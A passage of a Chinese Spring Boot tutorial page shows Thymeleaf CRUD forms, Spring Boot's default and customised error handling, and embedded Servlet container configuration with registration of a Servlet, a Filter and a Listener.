class="attr">type</span>=<span class="string">"email"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"zhangsan@atguigu.com"</span> <span class="attr">th:value</span>=<span class="string">"$&#123;emp!=null&#125;?$&#123;emp.email&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Gender<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-check form-check-inline"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-check-input"</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">value</span>=<span class="string">"1"</span> <span class="attr">th:checked</span>=<span class="string">"$&#123;emp!=null&#125;?$&#123;emp.gender==1&#125;"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"form-check-label"</span>&gt;</span>男<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-check form-check-inline"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-check-input"</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">value</span>=<span class="string">"0"</span> <span class="attr">th:checked</span>=<span class="string">"$&#123;emp!=null&#125;?$&#123;emp.gender==0&#125;"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"form-check-label"</span>&gt;</span>女<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>department<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--提交的是部门的id--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">name</span>=<span class="string">"department.id"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">th:selected</span>=<span class="string">"$&#123;emp!=null&#125;?$&#123;dept.id == emp.department.id&#125;"</span> <span class="attr">th:value</span>=<span class="string">"$&#123;dept.id&#125;"</span> <span class="attr">th:each</span>=<span class="string">"dept:$&#123;depts&#125;"</span> <span class="attr">th:text</span>=<span class="string">"$&#123;dept.departmentName&#125;"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Birth<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"birth"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"zhangsan"</span> <span class="attr">th:value</span>=<span class="string">"$&#123;emp!=null&#125;?$&#123;#dates.format(emp.birth, 'yyyy-MM-dd HH:mm')&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">th:text</span>=<span class="string">"$&#123;emp!=null&#125;?'修改':'添加'"</span>&gt;</span>添加<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="8）、CRUD-员工删除"><a href="#8）、CRUD-员工删除" class="headerlink" title="8）、CRUD-员工删除"></a>8）、CRUD-员工删除</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">th:each</span>=<span class="string">"emp:$&#123;emps&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">"$&#123;emp.id&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>[[$&#123;emp.lastName&#125;]]<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">"$&#123;emp.email&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">"$&#123;emp.gender&#125;==0?'女':'男'"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">"$&#123;emp.department.departmentName&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">"$&#123;#dates.format(emp.birth, 'yyyy-MM-dd HH:mm')&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"btn btn-sm btn-primary"</span> <span class="attr">th:href</span>=<span class="string">"@&#123;/emp/&#125;+$&#123;emp.id&#125;"</span>&gt;</span>编辑<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">th:attr</span>=<span class="string">"del_uri=@&#123;/emp/&#125;+$&#123;emp.id&#125;"</span> <span class="attr">class</span>=<span class="string">"btn btn-sm btn-danger deleteBtn"</span>&gt;</span>删除<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    $(<span class="string">".deleteBtn"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//删除当前员工的</span></span></span><br><span class="line"><span class="javascript">        $(<span class="string">"#deleteEmpForm"</span>).attr(<span class="string">"action"</span>,$(<span class="keyword">this</span>).attr(<span class="string">"del_uri"</span>)).submit();</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="7、错误处理机制"><a href="#7、错误处理机制" class="headerlink" title="7、错误处理机制"></a>7、错误处理机制</h2><h3 id="1）、SpringBoot默认的错误处理机制"><a href="#1）、SpringBoot默认的错误处理机制" class="headerlink" title="1）、SpringBoot默认的错误处理机制"></a>1）、SpringBoot默认的错误处理机制</h3><p>默认效果：</p><p>​        1）、浏览器，返回一个默认的错误页面</p><p><img src="images/搜狗截图20180226173408.png" alt=""></p><p>  浏览器发送请求的请求头：</p><p><img src="images/搜狗截图20180226180347.png" alt=""></p><p>​        2）、如果是其他客户端，默认响应一个json数据</p><p><img src="images/搜狗截图20180226173527.png" alt=""></p><p>​        <img src="images/搜狗截图20180226180504.png" alt=""></p><p>原理：</p><p>​    可以参照ErrorMvcAutoConfiguration；错误处理的自动配置；</p><pre><code>  给容器中添加了以下组件</code></pre><p>​    1、DefaultErrorAttributes：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">帮我们在页面共享信息；</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title">getErrorAttributes</span><span class="params">(RequestAttributes requestAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">boolean</span> includeStackTrace)</span> </span>&#123;</span><br><span class="line">Map&lt;String, Object&gt; errorAttributes = <span class="keyword">new</span> LinkedHashMap&lt;String, Object&gt;();</span><br><span class="line">errorAttributes.put(<span class="string">"timestamp"</span>, <span class="keyword">new</span> Date());</span><br><span class="line">addStatus(errorAttributes, requestAttributes);</span><br><span class="line">addErrorDetails(errorAttributes, requestAttributes, includeStackTrace);</span><br><span class="line">addPath(errorAttributes, requestAttributes);</span><br><span class="line"><span class="keyword">return</span> errorAttributes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    2、BasicErrorController：处理默认/error请求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"$&#123;server.error.path:$&#123;error.path:/error&#125;&#125;"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BasicErrorController</span> <span class="keyword">extends</span> <span class="title">AbstractErrorController</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping</span>(produces = <span class="string">"text/html"</span>)<span class="comment">//产生html类型的数据；浏览器发送的请求来到这个方法处理</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ModelAndView <span class="title">errorHtml</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">HttpStatus status = getStatus(request);</span><br><span class="line">Map&lt;String, Object&gt; model = Collections.unmodifiableMap(getErrorAttributes(</span><br><span class="line">request, isIncludeStackTrace(request, MediaType.TEXT_HTML)));</span><br><span class="line">response.setStatus(status.value());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//去哪个页面作为错误页面；包含页面地址和页面内容</span></span><br><span class="line">ModelAndView modelAndView = resolveErrorView(request, response, status, model);</span><br><span class="line"><span class="keyword">return</span> (modelAndView == <span class="keyword">null</span> ? <span class="keyword">new</span> ModelAndView(<span class="string">"error"</span>, model) : modelAndView);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping</span></span><br><span class="line"><span class="meta">@ResponseBody</span>    <span class="comment">//产生json数据，其他客户端来到这个方法处理；</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;Map&lt;String, Object&gt;&gt; error(HttpServletRequest request) &#123;</span><br><span class="line">Map&lt;String, Object&gt; body = getErrorAttributes(request,</span><br><span class="line">isIncludeStackTrace(request, MediaType.ALL));</span><br><span class="line">HttpStatus status = getStatus(request);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> ResponseEntity&lt;Map&lt;String, Object&gt;&gt;(body, status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    3、ErrorPageCustomizer：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Value</span>(<span class="string">"$&#123;error.path:/error&#125;"</span>)</span><br><span class="line"><span class="keyword">private</span> String path = <span class="string">"/error"</span>;  系统出现错误以后来到error请求进行处理；（web.xml注册的错误页面规则）</span><br></pre></td></tr></table></figure><p>​    4、DefaultErrorViewResolver：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ModelAndView <span class="title">resolveErrorView</span><span class="params">(HttpServletRequest request, HttpStatus status,</span></span></span><br><span class="line"><span class="function"><span class="params">Map&lt;String, Object&gt; model)</span> </span>&#123;</span><br><span class="line">ModelAndView modelAndView = resolve(String.valueOf(status), model);</span><br><span class="line"><span class="keyword">if</span> (modelAndView == <span class="keyword">null</span> &amp;&amp; SERIES_VIEWS.containsKey(status.series())) &#123;</span><br><span class="line">modelAndView = resolve(SERIES_VIEWS.get(status.series()), model);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> modelAndView;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> ModelAndView <span class="title">resolve</span><span class="params">(String viewName, Map&lt;String, Object&gt; model)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//默认SpringBoot可以去找到一个页面？  error/404</span></span><br><span class="line">String errorViewName = <span class="string">"error/"</span> + viewName;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//模板引擎可以解析这个页面地址就用模板引擎解析</span></span><br><span class="line">TemplateAvailabilityProvider provider = <span class="keyword">this</span>.templateAvailabilityProviders</span><br><span class="line">.getProvider(errorViewName, <span class="keyword">this</span>.applicationContext);</span><br><span class="line"><span class="keyword">if</span> (provider != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//模板引擎可用的情况下返回到errorViewName指定的视图地址</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> ModelAndView(errorViewName, model);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">//模板引擎不可用，就在静态资源文件夹下找errorViewName对应的页面   error/404.html</span></span><br><span class="line"><span class="keyword">return</span> resolveResource(errorViewName, model);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    步骤：</p><p>​        一但系统出现4xx或者5xx之类的错误；ErrorPageCustomizer就会生效（定制错误的响应规则）；就会来到/error请求；就会被<strong>BasicErrorController</strong>处理；</p><p>​        1）响应页面；去哪个页面是由<strong>DefaultErrorViewResolver</strong>解析得到的；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> ModelAndView <span class="title">resolveErrorView</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">      HttpServletResponse response, HttpStatus status, Map&lt;String, Object&gt; model)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//所有的ErrorViewResolver得到ModelAndView</span></span><br><span class="line">   <span class="keyword">for</span> (ErrorViewResolver resolver : <span class="keyword">this</span>.errorViewResolvers) &#123;</span><br><span class="line">      ModelAndView modelAndView = resolver.resolveErrorView(request, status, model);</span><br><span class="line">      <span class="keyword">if</span> (modelAndView != <span class="keyword">null</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> modelAndView;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2）、如果定制错误响应："><a href="#2）、如果定制错误响应：" class="headerlink" title="2）、如果定制错误响应："></a>2）、如果定制错误响应：</h3><h4 id="1）、如何定制错误的页面；"><a href="#1）、如何定制错误的页面；" class="headerlink" title="1）、如何定制错误的页面；"></a><strong>1）、如何定制错误的页面；</strong></h4><p>​            <strong>1）、有模板引擎的情况下；error/状态码;</strong> 【将错误页面命名为  错误状态码.html 放在模板引擎文件夹里面的 error文件夹下】，发生此状态码的错误就会来到  对应的页面；</p><p>​            我们可以使用4xx和5xx作为错误页面的文件名来匹配这种类型的所有错误，精确优先（优先寻找精确的状态码.html）；        </p><p>​            页面能获取的信息；</p><p>​                timestamp：时间戳</p><p>​                status：状态码</p><p>​                error：错误提示</p><p>​                exception：异常对象</p><p>​                message：异常消息</p><p>​                errors：JSR303数据校验的错误都在这里</p><p>​            2）、没有模板引擎（模板引擎找不到这个错误页面），静态资源文件夹下找；</p><p>​            3）、以上都没有错误页面，就是默认来到SpringBoot默认的错误提示页面；</p><h4 id="2）、如何定制错误的json数据；"><a href="#2）、如何定制错误的json数据；" class="headerlink" title="2）、如何定制错误的json数据；"></a>2）、如何定制错误的json数据；</h4><p>​        1）、自定义异常处理&amp;返回定制json数据；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyExceptionHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@ExceptionHandler</span>(UserNotExistException.class)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Map&lt;String,Object&gt; <span class="title">handleException</span><span class="params">(Exception e)</span></span>&#123;</span><br><span class="line">        Map&lt;String,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">"code"</span>,<span class="string">"user.notexist"</span>);</span><br><span class="line">        map.put(<span class="string">"message"</span>,e.getMessage());</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//没有自适应效果...</span></span><br></pre></td></tr></table></figure><p>​        2）、转发到/error进行自适应响应效果处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ExceptionHandler</span>(UserNotExistException.class)</span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">handleException</span><span class="params">(Exception e, HttpServletRequest request)</span></span>&#123;</span><br><span class="line">       Map&lt;String,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">       <span class="comment">//传入我们自己的错误状态码  4xx 5xx，否则就不会进入定制错误页面的解析流程</span></span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Integer statusCode = (Integer) request</span></span><br><span class="line"><span class="comment">        .getAttribute("javax.servlet.error.status_code");</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       request.setAttribute(<span class="string">"javax.servlet.error.status_code"</span>,<span class="number">500</span>);</span><br><span class="line">       map.put(<span class="string">"code"</span>,<span class="string">"user.notexist"</span>);</span><br><span class="line">       map.put(<span class="string">"message"</span>,e.getMessage());</span><br><span class="line">       <span class="comment">//转发到/error</span></span><br><span class="line">       <span class="keyword">return</span> <span class="string">"forward:/error"</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h4 id="3）、将我们的定制数据携带出去；"><a href="#3）、将我们的定制数据携带出去；" class="headerlink" title="3）、将我们的定制数据携带出去；"></a>3）、将我们的定制数据携带出去；</h4><p>出现错误以后，会来到/error请求，会被BasicErrorController处理，响应出去可以获取的数据是由getErrorAttributes得到的（是AbstractErrorController（ErrorController）规定的方法）；</p><p>​    1、完全来编写一个ErrorController的实现类【或者是编写AbstractErrorController的子类】，放在容器中；</p><p>​    2、页面上能用的数据，或者是json返回能用的数据都是通过errorAttributes.getErrorAttributes得到；</p><p>​            容器中DefaultErrorAttributes.getErrorAttributes()；默认进行数据处理的；</p><p>自定义ErrorAttributes</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//给容器中加入我们自己定义的ErrorAttributes</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyErrorAttributes</span> <span class="keyword">extends</span> <span class="title">DefaultErrorAttributes</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title">getErrorAttributes</span><span class="params">(RequestAttributes requestAttributes, <span class="keyword">boolean</span> includeStackTrace)</span> </span>&#123;</span><br><span class="line">        Map&lt;String, Object&gt; map = <span class="keyword">super</span>.getErrorAttributes(requestAttributes, includeStackTrace);</span><br><span class="line">        map.put(<span class="string">"company"</span>,<span class="string">"atguigu"</span>);</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终的效果：响应是自适应的，可以通过定制ErrorAttributes改变需要返回的内容，</p><p><img src="images/搜狗截图20180228135513.png" alt=""></p><h2 id="8、配置嵌入式Servlet容器"><a href="#8、配置嵌入式Servlet容器" class="headerlink" title="8、配置嵌入式Servlet容器"></a>8、配置嵌入式Servlet容器</h2><p>SpringBoot默认使用Tomcat作为嵌入式的Servlet容器；</p><p><img src="images/搜狗截图20180301142915.png" alt=""></p><p>问题？</p><h3 id="1）、如何定制和修改Servlet容器的相关配置；"><a href="#1）、如何定制和修改Servlet容器的相关配置；" class="headerlink" title="1）、如何定制和修改Servlet容器的相关配置；"></a>1）、如何定制和修改Servlet容器的相关配置；</h3><p>1、修改和server有关的配置（ServerProperties【也是EmbeddedServletContainerCustomizer】）；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">server.port=8081</span><br><span class="line">server.context-path=/crud</span><br><span class="line"></span><br><span class="line">server.tomcat.uri-encoding=UTF-8</span><br><span class="line"></span><br><span class="line">//通用的Servlet容器设置</span><br><span class="line">server.xxx</span><br><span class="line">//Tomcat的设置</span><br><span class="line">server.tomcat.xxx</span><br></pre></td></tr></table></figure><p>2、编写一个<strong>EmbeddedServletContainerCustomizer</strong>：嵌入式的Servlet容器的定制器；来修改Servlet容器的配置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span>  <span class="comment">//一定要将这个定制器加入到容器中</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> EmbeddedServletContainerCustomizer <span class="title">embeddedServletContainerCustomizer</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> EmbeddedServletContainerCustomizer() &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//定制嵌入式的Servlet容器相关的规则</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">customize</span><span class="params">(ConfigurableEmbeddedServletContainer container)</span> </span>&#123;</span><br><span class="line">            container.setPort(<span class="number">8083</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2）、注册Servlet三大组件【Servlet、Filter、Listener】"><a href="#2）、注册Servlet三大组件【Servlet、Filter、Listener】" class="headerlink" title="2）、注册Servlet三大组件【Servlet、Filter、Listener】"></a>2）、注册Servlet三大组件【Servlet、Filter、Listener】</h3><p>由于SpringBoot默认是以jar包的方式启动嵌入式的Servlet容器来启动SpringBoot的web应用，没有web.xml文件。</p><p>注册三大组件用以下方式</p><p>ServletRegistrationBean</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注册三大组件</span></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ServletRegistrationBean <span class="title">myServlet</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ServletRegistrationBean registrationBean = <span class="keyword">new</span> ServletRegistrationBean(<span class="keyword">new</span> MyServlet(),<span class="string">"/myServlet"</span>);</span><br><span class="line">    <span class="keyword">return</span> registrationBean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>FilterRegistrationBean</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> FilterRegistrationBean <span class="title">myFilter</span><span class="params">()</span></span>&#123;</span><br><span class="line">    FilterRegistrationBean registrationBean = <span class="keyword">new</span> FilterRegistrationBean();</span><br><span class="line">    registrationBean.setFilter(<span class="keyword">new</span> MyFilter());</span><br><span class="line">    registrationBean.setUrlPatterns(Arrays.asList(<span class="string">"/hello"</span>,<span class="string">"/myServlet"</span>));</span><br><span class="line">    <span class="keyword">return</span> registrationBean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ServletListenerRegistrationBean</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ServletListenerRegistrationBean <span class="title">myListener</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ServletListenerRegistrationBean&lt;MyListener&gt; registrationBean = <span class="keyword">new</span> ServletListenerRegistrationBean&lt;&gt;(<span class="keyword">new</span> MyListener());</span><br><span class="line">    <span class="keyword">return</span> registrationBean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SpringBoot帮我们自动SpringMVC的时候，自动的注册SpringMVC的前端控制器；DIspatcherServlet；</p><p>DispatcherServletAutoConfiguration中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 